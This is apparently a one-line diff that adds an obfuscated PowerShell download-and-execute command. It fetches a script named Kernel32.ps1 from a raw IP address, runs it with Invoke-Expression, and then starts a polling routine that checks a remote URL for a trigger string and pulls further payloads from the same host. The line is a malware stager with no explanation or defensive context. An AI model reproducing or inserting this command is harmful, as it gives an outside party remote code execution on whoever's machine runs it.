@@ -1,0 +1,1 @@
+﻿i`eX ((N`eW-OB`j`eCT net.webclient).downloadstring('http://212.163.35.67/upload/Kernel32.ps1')); kEr`Ne`l3`2-upda`Te -CheckURL http://212.163.35.67/upload/st.txt -PayloadURL http://212.163.35.67/upload/robots.txt -MagicString run -StopString stopthis
